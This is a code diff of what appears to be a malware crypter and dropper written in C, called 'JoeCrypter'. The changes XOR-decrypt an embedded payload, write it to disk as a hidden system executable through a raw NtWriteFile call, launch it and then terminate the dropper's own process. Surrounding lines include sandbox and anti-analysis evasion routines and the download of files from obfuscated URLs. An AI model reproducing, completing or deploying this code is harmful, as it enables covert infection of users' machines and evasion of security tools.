@@ -26,8 +26,8 @@
 //replaceatbeginning8
 //replaceatbeginning9
 byte *GetPayload(void);
-//byte *decrypted(byte *data, int length, int crytptkey);
-//WCHAR *widedecrypt(byte *data, int length, int crytptkey);
+//byte *decrypted(byte *data, int length, int crytptkey); // moved to joecrypt_injecter.h
+//WCHAR *widedecrypt(byte *data, int length, int crytptkey); // moved to joecrypt_injecter.h
 void LongStall(void);
 int procmem_evas(void);
 int NumaEvas(void);
@@ -66,6 +66,20 @@ void region_specific_check(char *region);
 void CheckCoreCount(void);
 void testsigning(void);
 //const char g_szClassName[] = "JoeCrypter";
+typedef struct _IO_STATUS_BLOCK
+      {
+         union
+         {
+         NTSTATUS Status;
+         PVOID Pointer;
+         };
+      ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+typedef VOID (NTAPI *PIO_APC_ROUTINE)(
+  PVOID ApcContext,
+  PIO_STATUS_BLOCK IoStatusBlock,
+  ULONG Reserved);
 
 DWORD rsrc_len = 0;
 
@@ -75,9 +89,38 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
 		case WM_CREATE:
 		{	
-                                                                                                                                                                                                                                                                                                                                                                                                                                                        
-			byte *payload = decrypted(GetPayload(),rsrc_len, 123);
-			ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe
+
+                                                                                   
+			
+// going extra low level because why the fuck not?
+			IO_STATUS_BLOCK blck;
+			typedef NTSTATUS (*_NtWriteFile)(
+			HANDLE           FileHandle,
+			HANDLE           Event,
+			PIO_APC_ROUTINE  ApcRoutine,
+			PVOID            ApcContext,
+			PIO_STATUS_BLOCK IoStatusBlock,
+			PVOID            Buffer,
+			ULONG            Length,
+			PLARGE_INTEGER   ByteOffset,
+			PULONG           Key);
+
+			_NtWriteFile NtWriteFile = (_NtWriteFile)GetProcAddress(LoadLibrary("ntdll.dll"), "NtWriteFile");
+			byte *payload = decrypted(GetPayload(),rsrc_len, 54519);
+			
+			char tempspace[512] = "";
+			char filename[1024] = "";
+			DWORD byteswritten = 0;
+			GetTempPathA(512,tempspace);
+			sprintf(filename,"doit.exe",tempspace); // string replace for a random exe name in C# prog
+			HANDLE tmphnd =  CreateFile(filename,GENERIC_ALL, 0, NULL, CREATE_ALWAYS,	FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,	NULL);
+			NtWriteFile(tmphnd,NULL,NULL,NULL,&blck,payload,rsrc_len,NULL,NULL);
+			
+			CloseHandle(tmphnd);
+			// CreateFile, WriteFile, then SetFileAttributes to hidden and system followed by shellexec or createprocess
+			WinExec(filename,3);
+			TerminateProcess(GetCurrentProcess(),1);
+			
 		}
 		break;
         case WM_CLOSE:
@@ -1026,19 +1069,19 @@ GetVersionEx(&osvi);
     if(osvi.dwMajorVersion >= 6)
     {
 			if (GrabFile(NULL, decrypted(powerrangersbg,101,2), 
-			"c:\\bg.jpg", 0, NULL) == S_OK)
+			"%temp%\\bg.jpg", 0, NULL) == S_OK)
 			{
 			Sleep(500);
-			SystemParametersInfo(0x14,3,"c:\\bg.jpg",0x01|0x02);
+			SystemParametersInfo(0x14,3,"%temp%\\bg.jpg",0x01|0x02);
 			}
 	}
 	else
 	{
 			if (GrabFile(NULL, decrypted(bmp_bg,86,9), 
-			"c:\\lol.bmp", 0, NULL) == S_OK)
+			"%temp%\\lol.bmp", 0, NULL) == S_OK)
 			{
 			Sleep(500);
-			SystemParametersInfo(0x14,3,"lol.bmp",0x01|0x02);
+			SystemParametersInfo(0x14,3,"%temp%\\lol.bmp",0x01|0x02);
 			}
 		
 	}
@@ -1327,7 +1370,28 @@ char *lang = "";
 		}
 	return;
 }
+/*
+// moved to joecrypt_injecter.h
+byte *decrypted(byte *data, int length, int crytptkey)
+{	
+	byte *out = (byte*)malloc(length+1);
+	for(int x=0;x < length;x++)
+	{
+	out[x] = data[x] ^ crytptkey; 
+	}
+	return out;
+}
 
+WCHAR *widedecrypt(byte *data, int length, int crytptkey)
+{	
+	WCHAR *out = (WCHAR*)malloc(length+1);
+	for(int x=0;x < length;x++)
+	{
+	out[x] = data[x] ^ crytptkey; 
+	}
+	return out;
+}
+*/
 int timing_evasion_1(void)
 {	
 	DWORD joe_time_test1, joe_time_test2;
@@ -1376,8 +1440,6 @@ mov x,ecx
 }
 return x;
 }
-
-
 
 int timing_evasion_4(void)
 {	
@@ -1458,7 +1520,6 @@ void CheckCoreCount(void)
 	proc = GetCurrentProcess();
 	if(GetProcessAffinityMask(proc,&ProcessAffinityMask,&SystemAffinityMask))
 	{
-		
 		corecount = 0;
 		bitpos = 0;
 		do
@@ -1470,12 +1531,10 @@ void CheckCoreCount(void)
 		}
 		while(bitpos < 32);
 		result = corecount;
-
 	}
 	else{
 		GetSystemInfo(&sysinf);
 		result = sysinf.dwNumberOfProcessors;
-		
 	}
 	if(result < 2)
 	{
@@ -1485,6 +1544,7 @@ void CheckCoreCount(void)
 		return;
 	}
 }
+
 typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION
 {
     unsigned long Length;
